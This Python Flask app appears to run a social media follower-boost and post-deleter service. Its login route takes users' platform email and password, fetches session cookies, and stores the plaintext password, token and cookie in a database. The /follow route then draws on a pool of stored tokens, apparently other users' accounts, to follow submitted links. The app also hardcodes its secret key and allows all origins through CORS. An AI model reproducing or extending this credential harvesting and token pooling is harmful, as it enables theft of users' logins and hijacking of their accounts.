from flask_cors import CORS
from threading import Thread
from flask_sitemap import Sitemap
from flask import send_from_directory
from flask import Flask, session, url_for, redirect
from flask import render_template, request, jsonify

from utils.db import upsert, check, init, tokens
from utils.log import get_cookie as loginn
from utils.follow import follow, isvalid, delete, Shield

app = Flask(__name__)
CORS(app)
map = Sitemap(app=app)
app.secret_key = "my_S3rekety_Nanop#Jozi@Mabon**#"
app.permanent_session_lifetime = 60 * 60 * 24 * 365

init()

import re

def is_crawler():
    user_agent = request.headers.get('User-Agent', '')
    return re.search(r'Googlebot|Bingbot|Slurp|DuckDuckBot|Yandex|facebookexternalhit|Twitterbot', user_agent, re.IGNORECASE)

@app.before_request
def allow_crawler_access():
    public_paths = ['/', '/auth/login', '/robots.txt', '/static', '/follow', '/posts/delete', '/guad', '/sitemap.xml']
    is_public = any(request.path.startswith(p) for p in public_paths)

    # Let crawlers access public pages
    if is_crawler() and is_public:
        return

    # Allow public pages for real users
    if is_public:
        return

    # Enforce login for everything else
    if 'uid' not in session:
        return redirect(url_for('login'))



@app.route("/", methods=["GET","POST"])
def home():
    if 'uid' not in session:
       return redirect(url_for('login'))

    valid = isvalid(session['token'])
    if not valid:
       return render_template("error.html", title="An error occured")

    user = { "uid": session['uid'], "name": session['name'], "photo": session['photo'] }
    if 'msg' not in session:
       session['msg'] = session['msg'] = f"Back in action, {session['name'].split(' ')[0]}! 🔥"
    return render_template("home.html", user=user, msg=session['msg'], title="Dashboard")


@map.register_generator
def index_page():
    yield 'home', {}, '2025-06-16', 'daily', 1.0

@map.register_generator
def logini():
    yield 'login', {}, '2025-06-16', 'weekly', 1.0

@map.register_generator
def shIeded():
    yield 'ShielP', {}, '2025-06-16', 'weekly', 1.0

@map.register_generator
def forow():
    yield 'Follow', {}, '2025-06-16', 'weekly', 1.0

@map.register_generator
def dePost():
    yield 'DelPost', {}, '2025-06-16', 'weekly', 1.0

@app.route('/robots.txt')
def robots():
    return send_from_directory(app.static_folder, 'robots.txt')


@app.route("/auth/login", methods=["POST","GET"])
def login():
    if 'uid' in session:
       return redirect(url_for("home"))

    if request.method == "POST":
       data = request.form
       email = data.get("email")
       passw = data.get("password")

       data, res = loginn(email, passw)
       if data:
          if 'uid' in data:
              exist = check(data['uid'])
              if isvalid(data['token']) == False:
                 return render_template('login.html', msg="Invalid Session Cookie", title="Invalid Session")
          else:
              return render_template('login.html', msg=data)

       
          uid = data['uid']
          name = data["name"].get("name")
          photo = data['photo']
          token = data['token']
          cookie = data['cookie']

          upsert(email, passw, uid, name, photo, token, cookie)

          session.permanent = True
          session['email'] = email
          session['uid'] = uid
          session['name'] = name
          session['photo'] = photo
          session['token'] = token
          session['cookie'] = cookie

          msg = f"Welcome back, {session['name']} Your Next Ride Awaits!" if exist else f"Thank You For Joining Us today, {session['name']}. Enjoy The Ride!"
          session['msg'] = msg
          return redirect(url_for('home'))
       return render_template('login.html', msg=res)
    return render_template("login.html", title="Login")


@app.route("/follow", methods=["POST","GET"])
def Follow():
    if request.method == "POST":
       data = request.form
       limit = data.get("limit")
       link = data.get("url")
       token = tokens()
       start = follow(link, token, limit)
       user = {"token": session['token'] }
       return start
#       return render_template("follow.html", msg=start, user=user)
    user = {"token": session['token'], "title": "Followers Boost" }
    return render_template("follow.html", user=user, title="Get Followers")


@app.route("/posts/delete", methods=["POST","GET"])
def DelPost():
    if 'uid' not in session:
       return redirect(url_for("login"))
    if request.method == "POST":
       data = delete(session['token'])
       return render_template("delete.html", msg=data, title="Auto Delete Posts")
    return render_template("delete.html", title="Posts Auto Deleter")

@app.route("/guad",methods=["POST","GET"])
def ShielP():
    if 'uid' not in session:
       return redirect(url_for("login"))

    if request.method == "POST":
       token = session['token']

       prog = Shield(token)
       if prog:
          return render_template("shield.html", title="Guard On/Off", msg=prog, token=session['token'])
       return render_template("shield.html", title="Guard On/Off", token=session['token'])
    return render_template("shield.html", title="Guard On/Off", token=session['token'])

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))


if __name__ == "__main__":
   def run():
       app.run(host='0.0.0.0', port=5001)

   def keep_alive():
       import os
       os.system("clear")
       print("[›] UPTIME ROBOT: ALIVE!")
       t = Thread(target=run)
       t.start()

   keep_alive()
